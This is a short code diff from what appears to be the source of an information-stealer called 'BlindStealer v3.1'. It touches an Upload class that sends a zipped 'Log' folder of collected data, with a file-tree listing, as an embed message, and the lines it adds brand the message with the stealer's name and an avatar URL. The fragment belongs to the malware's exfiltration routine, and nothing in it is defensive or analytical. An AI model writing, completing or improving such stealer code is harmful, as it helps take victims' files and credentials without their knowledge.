@@ -64,6 +64,8 @@ class Upload:
                 title="Log",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
                 color=0x24262A,
+                username="BlindStealer - v3.1",
+                avatar_url="https://i.imgur.com/LNVOaxg.png",
             ),
             file=File("Log.zip"),
         )
